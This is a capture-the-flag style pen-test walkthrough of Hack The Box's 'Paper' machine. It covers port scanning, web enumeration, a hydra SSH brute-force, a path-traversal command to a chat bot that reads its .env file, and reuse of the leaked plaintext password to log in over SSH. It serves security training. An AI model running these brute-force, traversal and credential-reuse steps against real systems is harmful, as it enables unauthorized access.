# PenTest-Example
### A demonstration walkthrough of a pen test process using HTB's Paper with some normal dead ends as an example.  

*Note* /etc/hosts appended with "10.10.11.143 paper.htb"
Basic scan of all ports 
```
nmap -p- paper.htb
```

The preferred way to scan.  A fast scan of all ports then a deeper scan for services on the found ports  
```
ports=$(nmap -p- --min-rate=1000 -T4 paper.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports paper.htb
nikto -h paper.htb
```
Interesting Results (NMAP):  
- Running OpenSSH 8.0 and Apache httpd 2.4.37 on CentOS  
Interesting Results (NIKTO):   
- OSVDB-877: TRACE and missing common protection headers.  Set this aside unless we user traffic to escalate.
- Uncommon header 'x-backend-server' found, with contents: office.paper
- Retrieved x-powered-by header: PHP/7.2.24

**DEAD END:** Browsing site shows only the default install page, nothing interesting in source, HTTPS: fails cert validation.  
**DEAD END:**  Using Hydra to guess common username/passwords for SSH.  Trying a small set of default username and password combinations work more often in real world vs. simulations.  
```
echo 'root\nuser\nadmin\nadministrator\ndevelopment\ntest\napache\nbountyhunter' > usernames
echo 'password\nPassword\nPassw0rd\nPassw0rd!' > passwords
hydra -L usernames -P passwords -e nsr ssh://paper.htb

**DEAD END:** Using dirbuster results were only standard Apache files

Added backend server to /etc/hosts:  "10.10.11.143 office.paper"
```
nikto -h office.paper
```
Interesting results:
- Link to WordPress API docs: https://api.w.org
- 'x-redirect-by' found, with contents: WordPress

Browsed "office.paper" added a far possible username to hyrda files.  Following chat noticed command about unsafe draft content.
```
wpscan --url http://office.paper
```
WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
```
searchsploit wordpress 5.2.3
cat /usr/share/exploitdb/exploits/multiple/webapps/47690.md
```

Browsed to http://office.paper/?static=1  
Draft leads to a chat server and secret registration page: http://chat.office.paper/register/8qozr226AhkCHZdyY  

Added "10.10.11.143 chat.office.paper" to /etc/hosts
**DEAD END:** Nikto and dirbuster on added hosts didn't yeild any fun results

Read the blog posts. Fun "The Office" references lots of names to add to Hydra lists.
Dwight setup a bot, seems he is admin, Googled "The office" and password, more things added hydra files.

The bot will take commands.
**DEAD END** Trying command injection, nothing I tried worked.  Limited to 'list' and 'file' commands
**Comment"" First pass on enum drew a blank beyond the fact that Dwight set up the bot. Googling RocketChat configuration lead to using environment variables. 
A seocnd pass of enum landed on "file ../../dwight/hubot/.env"  
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23  
Added to hydra files

```
hydra -L paper.htb.users -P paper.htb.passwords ssh://paper.htb
```
[DATA] attacking ssh://paper.htb:22/
[22][ssh] host: paper.htb   login: dwight   password: Queenofblad3s!23
```
ssh dwight@paper.htb
```

**Decision (NMAP):** Software is relatively current, no standout CVEs that allow remote access, so we will move on.  
**Decision (NIKTO):** The OSVBD has been superseded by CVE.  Not much to work with except `php` is being used.
CVE-2019-17675
CVE-20201-4034
